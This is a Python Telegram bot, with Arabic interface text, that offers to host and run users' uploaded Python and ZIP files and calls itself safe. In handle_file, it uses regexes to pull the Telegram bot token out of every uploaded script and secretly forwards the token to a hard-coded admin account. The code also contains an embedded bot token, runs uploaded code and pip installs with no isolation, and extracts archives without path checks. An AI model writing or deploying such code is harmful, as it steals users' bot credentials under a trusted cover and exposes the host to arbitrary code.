import telebot
from telebot import types
import subprocess
import os
import re
import zipfile
import threading
import time
from datetime import datetime
import platform

TOKEN = '7384019095:AAH5-rzlhgKpM0oZ8iMGl4DayJt9UAD3c2I'
bot = telebot.TeleBot(TOKEN)

admin_id = '6237935028'  # ايديك
max_file_size = 100 * 1024 * 1024  # 100 MB
max_files_per_user = 10  # الحد الأقصى للملفات لكل مستخدم
check_channel = '@kdlvs'  # القناة المطلوب الاشتراك فيها

uploaded_files = {}
banned_users = set()
users_start_status = {}
user_file_counts = {}
active_processes = {}
file_owners = {}

# إنشاء المجلدات المطلوبة
folders = ['uploads', 'logs', 'temp']
for folder in folders:
    if not os.path.exists(folder):
        os.makedirs(folder)

def log_activity(user_id, action, details):
    """تسجيل أنشطة المستخدمين"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] User {user_id}: {action} - {details}\n"
    with open('logs/activity.log', 'a', encoding='utf-8') as log_file:
        log_file.write(log_entry)

def check_subscription(user_id):
    """التحقق من اشتراك المستخدم في القناة"""
    try:
        member = bot.get_chat_member(check_channel, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"Error checking subscription: {e}")
        return False

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    
    if not check_subscription(user_id):
        markup = types.InlineKeyboardMarkup()
        subscribe_button = types.InlineKeyboardButton("اشترك الآن 📢", url=f'https://t.me/{check_channel[1:]}')
        check_button = types.InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data='check_subscription')
        markup.add(subscribe_button, check_button)
        bot.send_message(message.chat.id, "⚠️ يرجى الاشتراك في قناة المطور لاستكمال استخدام البوت.", reply_markup=markup)
        users_start_status[user_id] = False
    else:
        show_main_menu(message.chat.id, user_id)

def show_main_menu(chat_id, user_id):
    """عرض القائمة الرئيسية"""
    markup = types.InlineKeyboardMarkup()
    
    # أزرار الملفات
    upload_py_button = types.InlineKeyboardButton("رفع ملف .py 📤", callback_data='upload_py')
    upload_zip_button = types.InlineKeyboardButton("رفع ملف .zip 📤", callback_data='upload_zip')
    
    # أزرار التحكم
    my_files_button = types.InlineKeyboardButton("ملفاتي 📂", callback_data='my_files')
    stop_file_button = types.InlineKeyboardButton("إيقاف ملف ⏹", callback_data='stop_file')
    
    # أزرار معلومات
    status_button = types.InlineKeyboardButton("حالة البوت 🖥", callback_data='status')
    help_button = types.InlineKeyboardButton("مساعدة ⁉️", callback_data='help')
    developer_button = types.InlineKeyboardButton("المطور 👨‍💻", callback_data='developer')
    
    markup.row(upload_py_button, upload_zip_button)
    markup.row(my_files_button, stop_file_button)
    markup.row(status_button, help_button, developer_button)
    
    welcome_msg = """🚀 **مرحبًا بك في بوت رفع وتشغيل ملفات بايثون** 

📌 **الميزات المتاحة:**
- رفع وتشغيل ملفات بايثون مباشرة
- رفع ملفات مضغوطة واستخراجها
- إدارة الملفات المرفوعة
- مراقبة أداء البوت

⚙️ **الحدود:**
- حجم الملف الأقصى: 100MB
- الحد الأقصى للملفات لكل مستخدم: 10 ملفات

🔻 اختر من الأزرار أدناه للبدء."""
    
    bot.send_message(chat_id, welcome_msg, reply_markup=markup, parse_mode='Markdown')
    users_start_status[user_id] = True

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    """لوحة تحكم المشرف"""
    if str(message.from_user.id) == admin_id:
        markup = types.InlineKeyboardMarkup()
        stats_button = types.InlineKeyboardButton("إحصائيات 📊", callback_data='admin_stats')
        broadcast_button = types.InlineKeyboardButton("إذاعة 📢", callback_data='admin_broadcast')
        ban_button = types.InlineKeyboardButton("حظر مستخدم ⚠️", callback_data='admin_ban')
        unban_button = types.InlineKeyboardButton("رفع حظر ✅", callback_data='admin_unban')
        
        markup.row(stats_button, broadcast_button)
        markup.row(ban_button, unban_button)
        
        bot.send_message(message.chat.id, "🔐 **لوحة تحكم المشرف**", reply_markup=markup, parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, "⛔ ليس لديك صلاحية الوصول إلى هذه الأداة.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    
    if user_id in banned_users:
        bot.reply_to(message, "⛔ لقد تم حظرك من استخدام هذا البوت.")
        return
    
    if not users_start_status.get(user_id, False):
        bot.reply_to(message, "⚠️ يرجى استخدام /start والاشتراك في القناة أولاً.")
        return
    
    # التحقق من عدد الملفات المسموح بها
    if user_file_counts.get(user_id, 0) >= max_files_per_user:
        bot.reply_to(message, f"⚠️ لقد وصلت إلى الحد الأقصى للملفات المسموح بها ({max_files_per_user} ملفات).")
        return
    
    try:
        file_id = message.document.file_id
        file_name = message.document.file_name
        file_info = bot.get_file(file_id)
        file_size = file_info.file_size

        if file_size > max_file_size:
            bot.reply_to(message, "⚠️ حجم الملف أكبر من الحد المسموح به (100 ميغابايت).")
            return

        upload_path = os.path.join('uploads', f"{user_id}_{file_name}")

        if file_name.endswith('.zip'):
            # معالجة ملفات ZIP
            downloaded_file = bot.download_file(file_info.file_path)
            with open(upload_path, 'wb') as new_file:
                new_file.write(downloaded_file)

            extract_dir = os.path.splitext(upload_path)[0]
            if not os.path.exists(extract_dir):
                os.makedirs(extract_dir)

            with zipfile.ZipFile(upload_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)

            # تسجيل الملف
            uploaded_files[upload_path] = {
                'owner': user_id,
                'type': 'zip',
                'status': 'uploaded',
                'date': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            user_file_counts[user_id] = user_file_counts.get(user_id, 0) + 1
            file_owners[upload_path] = user_id
            
            bot.reply_to(message, f"✅ تم رفع ملف ZIP بنجاح\n\n📁 اسم الملف: {file_name}\n📦 تم استخراج المحتويات إلى مجلد منفصل")
            log_activity(user_id, "UPLOAD_ZIP", file_name)
            send_to_admin(f"📤 مستخدم رفع ملف ZIP\n👤 User ID: {user_id}\n📁 الملف: {file_name}")

        elif file_name.endswith('.py'):
            # معالجة ملفات Python
            downloaded_file = bot.download_file(file_info.file_path)
            with open(upload_path, 'wb') as new_file:
                new_file.write(downloaded_file)

            # تسجيل الملف
            uploaded_files[upload_path] = {
                'owner': user_id,
                'type': 'py',
                'status': 'uploaded',
                'date': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            user_file_counts[user_id] = user_file_counts.get(user_id, 0) + 1
            file_owners[upload_path] = user_id
            
            # تحليل الملف للعثور على التوكن
            bot_token = get_bot_token(upload_path)
            
            # تشغيل الملف في خيط منفصل
            try:
                thread = threading.Thread(target=run_python_file, args=(upload_path, user_id))
                thread.start()
                active_processes[upload_path] = {
                    'thread': thread,
                    'user_id': user_id,
                    'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                uploaded_files[upload_path]['status'] = 'running'
            except Exception as e:
                bot.reply_to(message, f"⚠️ حدث خطأ أثناء تشغيل الملف: {str(e)}")
                uploaded_files[upload_path]['status'] = 'error'
                log_activity(user_id, "RUN_ERROR", f"{file_name}: {str(e)}")
                return

            reply_msg = f"""✅ تم رفع وتشغيل ملف Python بنجاح

📄 اسم الملف: {file_name}
🔑 توكن البوت: {bot_token if bot_token else "غير موجود"}
🔄 الحالة: قيد التشغيل
📅 وقت الرفع: {uploaded_files[upload_path]['date']}"""

            bot.reply_to(message, reply_msg)
            log_activity(user_id, "UPLOAD_PY", file_name)
            send_to_admin(f"📤 مستخدم رفع ملف Python\n👤 User ID: {user_id}\n📄 الملف: {file_name}\n🔑 التوكن: {bot_token if bot_token else 'غير موجود'}")

        else:
            bot.reply_to(message, "⚠️ الملفات المسموح بها: .zip أو .py فقط.")
    except Exception as e:
        bot.reply_to(message, f"⚠️ حدث خطأ: {str(e)}")
        log_activity(user_id, "UPLOAD_ERROR", str(e))

def run_python_file(file_path, user_id):
    """تشغيل ملف Python في خيط منفصل"""
    try:
        # تثبيت المتطلبات إذا وجدت
        req_file = os.path.join(os.path.dirname(file_path), 'requirements.txt')
        if os.path.exists(req_file):
            subprocess.run(['pip', 'install', '-r', req_file], check=True)
        
        # تشغيل الملف
        process = subprocess.Popen(['python3', file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_processes[file_path]['process'] = process
        
        # تسجيل الناتج
        stdout, stderr = process.communicate()
        
        if process.returncode != 0:
            error_msg = stderr.decode('utf-8') if stderr else "Unknown error"
            log_activity(user_id, "SCRIPT_ERROR", f"{os.path.basename(file_path)}: {error_msg}")
            uploaded_files[file_path]['status'] = 'stopped'
        else:
            uploaded_files[file_path]['status'] = 'completed'
            
    except Exception as e:
        log_activity(user_id, "RUN_ERROR", f"{os.path.basename(file_path)}: {str(e)}")
        uploaded_files[file_path]['status'] = 'error'
    finally:
        if file_path in active_processes:
            del active_processes[file_path]

def get_bot_token(file_path):
    """استخراج توكن البوت من ملف Python"""
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read()
            # البحث عن التوكن بأنماط مختلفة
            patterns = [
                r'TOKEN\s*=\s*[\'"]([^\'"]*)[\'"]',
                r'bot\s*=\s*telebot\.TeleBot\([\'"]([^\'"]*)[\'"]\)',
                r'telebot\.TeleBot\([\'"]([^\'"]*)[\'"]\)'
            ]
            for pattern in patterns:
                match = re.search(pattern, content)
                if match:
                    return match.group(1)
            return None
    except Exception as e:
        print(f"Error getting token: {e}")
        return None

def send_to_admin(message_text):
    """إرسال رسالة إلى المشرف"""
    try:
        bot.send_message(admin_id, message_text)
    except Exception as e:
        print(f"Error sending to admin: {e}")

def get_system_stats():
    """الحصول على إحصائيات النظام (بدون psutil)"""
    stats_msg = """🖥 **إحصائيات البوت:**
    
🔹 **الملفات النشطة:** {}
🔹 **إجمالي الملفات المرفوعة:** {}
🔹 **المستخدمون المحظورون:** {}
🔹 **نظام التشغيل:** {} {}""".format(
        len(active_processes),
        len(uploaded_files),
        len(banned_users),
        platform.system(),
        platform.release()
    )
    
    return stats_msg

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    
    if call.data == 'upload_py':
        bot.send_message(call.message.chat.id, "📤 أرسل ملف Python (.py) الآن")
    elif call.data == 'upload_zip':
        bot.send_message(call.message.chat.id, "📤 أرسل ملف ZIP (.zip) الآن")
    elif call.data == 'status':
        bot.send_message(call.message.chat.id, get_system_stats(), parse_mode='Markdown')
    elif call.data == 'help':
        show_help(call.message.chat.id)
    elif call.data == 'developer':
        show_developer_info(call.message.chat.id)
    elif call.data == 'my_files':
        show_user_files(call.message.chat.id, user_id)
    elif call.data == 'stop_file':
        ask_which_file_to_stop(call.message.chat.id, user_id)
    elif call.data == 'check_subscription':
        if check_subscription(user_id):
            show_main_menu(call.message.chat.id, user_id)
        else:
            bot.answer_callback_query(call.id, "⚠️ لم تشترك في القناة بعد!", show_alert=True)
    elif call.data.startswith('stop_'):
        handle_stop_file(call)
    elif call.data.startswith('admin_'):
        handle_admin_commands(call)

def show_help(chat_id):
    help_msg = """🆘 **مساعدة واستخدام البوت**

📌 **كيفية الاستخدام:**
1. أرسل /start للبدء
2. اختر نوع الملف الذي تريد رفعه (.py أو .zip)
3. أرسل الملف وسيقوم البوت بمعالجته

⚙️ **الأوامر المتاحة:**
/start - بدء استخدام البوت
/help - عرض هذه الرسالة
/developer - معلومات المطور
/admin - لوحة التحكم (للمشرف فقط)

📝 **ملاحظات:**
- الحد الأقصى لحجم الملف: 100MB
- يتم تشغيل ملفات .py تلقائياً
- يتم استخراج ملفات .zip إلى مجلد منفصل
- يمكنك إدارة ملفاتك من خلال القائمة"""
    
    bot.send_message(chat_id, help_msg, parse_mode='Markdown')

def show_developer_info(chat_id):
    markup = types.InlineKeyboardMarkup()
    dev_button = types.InlineKeyboardButton("تواصل مع المطور 👨‍💻", url='https://t.me/A1R4E')
    channel_button = types.InlineKeyboardButton("قناة البوت 📢", url='https://t.me/blackena')
    markup.add(dev_button, channel_button)
    
    dev_msg = """👨‍💻 **معلومات المطور**

🔹 اسم المطور: blackx 
🔹 قناة التحديثات: @blackena
🔹 تواصل مباشر: @A1R4E

📌 هذا البوت مقدم من قناة بلاك للاستخدام الآمن لرفع وتشغيل ملفات بايثون."""
    
    bot.send_message(chat_id, dev_msg, reply_markup=markup, parse_mode='Markdown')

def show_user_files(chat_id, user_id):
    user_files = [f for f, data in uploaded_files.items() if data['owner'] == user_id]
    
    if not user_files:
        bot.send_message(chat_id, "⚠️ ليس لديك أي ملفات مرفوعة حالياً.")
        return
    
    files_msg = "📂 **ملفاتك المرفوعة:**\n\n"
    for i, file_path in enumerate(user_files, 1):
        file_name = os.path.basename(file_path)
        file_data = uploaded_files[file_path]
        files_msg += f"{i}. {file_name}\n"
        files_msg += f"   ⏳ الحالة: {file_data['status']}\n"
        files_msg += f"   📅 تاريخ الرفع: {file_data['date']}\n\n"
    
    bot.send_message(chat_id, files_msg)

def ask_which_file_to_stop(chat_id, user_id):
    user_files = [f for f, data in uploaded_files.items() 
                 if data['owner'] == user_id and data['status'] == 'running']
    
    if not user_files:
        bot.send_message(chat_id, "⚠️ ليس لديك أي ملفات قيد التشغيل حالياً.")
        return
    
    markup = types.InlineKeyboardMarkup()
    for file_path in user_files:
        file_name = os.path.basename(file_path)
        btn = types.InlineKeyboardButton(file_name, callback_data=f'stop_{file_path}')
        markup.add(btn)
    
    bot.send_message(chat_id, "🔻 اختر الملف الذي تريد إيقافه:", reply_markup=markup)

def handle_stop_file(call):
    user_id = call.from_user.id
    file_path = call.data[5:]
    
    if file_path not in uploaded_files:
        bot.answer_callback_query(call.id, "⚠️ الملف غير موجود!", show_alert=True)
        return
    
    if uploaded_files[file_path]['owner'] != user_id:
        bot.answer_callback_query(call.id, "⚠️ هذا الملف ليس لك!", show_alert=True)
        return
    
    if uploaded_files[file_path]['status'] != 'running':
        bot.answer_callback_query(call.id, "⚠️ الملف ليس قيد التشغيل!", show_alert=True)
        return
    
    # إيقاف الملف
    try:
        if file_path in active_processes:
            process = active_processes[file_path].get('process')
            if process:
                process.terminate()
            del active_processes[file_path]
        
        uploaded_files[file_path]['status'] = 'stopped'
        bot.answer_callback_query(call.id, "✅ تم إيقاف الملف بنجاح")
        bot.send_message(call.message.chat.id, f"⏹ تم إيقاف الملف: {os.path.basename(file_path)}")
        log_activity(user_id, "STOP_FILE", os.path.basename(file_path))
    except Exception as e:
        bot.answer_callback_query(call.id, f"⚠️ خطأ في الإيقاف: {str(e)}", show_alert=True)
        log_activity(user_id, "STOP_ERROR", f"{os.path.basename(file_path)}: {str(e)}")

def handle_admin_commands(call):
    user_id = call.from_user.id
    
    if str(user_id) != admin_id:
        bot.answer_callback_query(call.id, "⚠️ ليس لديك صلاحية الوصول!", show_alert=True)
        return
    
    if call.data == 'admin_stats':
        show_admin_stats(call.message.chat.id)
    elif call.data == 'admin_broadcast':
        ask_for_broadcast_message(call.message.chat.id)
    elif call.data == 'admin_ban':
        ask_for_user_to_ban(call.message.chat.id)
    elif call.data == 'admin_unban':
        ask_for_user_to_unban(call.message.chat.id)

def show_admin_stats(chat_id):
    total_users = len(users_start_status)
    active_users = sum(1 for status in users_start_status.values() if status)
    running_files = len(active_processes)
    
    stats_msg = f"""📊 **إحصائيات البوت (للمشرف)**

👥 **المستخدمون:**
- الإجمالي: {total_users}
- النشطون: {active_users}
- المحظورون: {len(banned_users)}

📁 **الملفات:**
- المرفوعة: {len(uploaded_files)}
- قيد التشغيل: {running_files}
- الموقوفة: {len([f for f in uploaded_files.values() if f['status'] == 'stopped'])}
- بها أخطاء: {len([f for f in uploaded_files.values() if f['status'] == 'error'])}

{get_system_stats()}"""
    
    bot.send_message(chat_id, stats_msg, parse_mode='Markdown')

def ask_for_broadcast_message(chat_id):
    msg = bot.send_message(chat_id, "✉️ أرسل الرسالة التي تريد إذاعتها لجميع المستخدمين:")
    bot.register_next_step_handler(msg, process_broadcast_message)

def process_broadcast_message(message):
    users_to_broadcast = [uid for uid, status in users_start_status.items() if status and uid not in banned_users]
    success = 0
    failed = 0
    
    bot.send_message(message.chat.id, f"⏳ جاري الإذاعة إلى {len(users_to_broadcast)} مستخدم...")
    
    for user_id in users_to_broadcast:
        try:
            bot.copy_message(user_id, message.chat.id, message.message_id)
            success += 1
        except Exception as e:
            failed += 1
            print(f"Error broadcasting to {user_id}: {e}")
    
    bot.send_message(message.chat.id, f"""✅ تمت الإذاعة بنجاح

✔️ تم الإرسال إلى: {success} مستخدم
❌ فشل الإرسال إلى: {failed} مستخدم""")

def ask_for_user_to_ban(chat_id):
    msg = bot.send_message(chat_id, "🔨 أرسل ID المستخدم الذي تريد حظره:")
    bot.register_next_step_handler(msg, process_ban_user)

def process_ban_user(message):
    try:
        user_id = int(message.text)
        banned_users.add(user_id)
        bot.send_message(message.chat.id, f"✅ تم حظر المستخدم {user_id}")
        log_activity(message.from_user.id, "BAN_USER", str(user_id))
    except ValueError:
        bot.send_message(message.chat.id, "⚠️ يجب إدخال ID مستخدم صحيح (أرقام فقط)")

def ask_for_user_to_unban(chat_id):
    if not banned_users:
        bot.send_message(chat_id, "⚠️ لا يوجد مستخدمين محظورين حالياً.")
        return
    
    msg = bot.send_message(chat_id, f"🔓 أرسل ID المستخدم الذي تريد رفع حظره (المحظورون: {', '.join(map(str, banned_users))}):")
    bot.register_next_step_handler(msg, process_unban_user)

def process_unban_user(message):
    try:
        user_id = int(message.text)
        if user_id in banned_users:
            banned_users.remove(user_id)
            bot.send_message(message.chat.id, f"✅ تم رفع حظر المستخدم {user_id}")
            log_activity(message.from_user.id, "UNBAN_USER", str(user_id))
        else:
            bot.send_message(message.chat.id, "⚠️ هذا المستخدم غير محظور!")
    except ValueError:
        bot.send_message(message.chat.id, "⚠️ يجب إدخال ID مستخدم صحيح (أرقام فقط)")

if __name__ == '__main__':
    pass  # لن يتم تشغيل البوت مباشرةً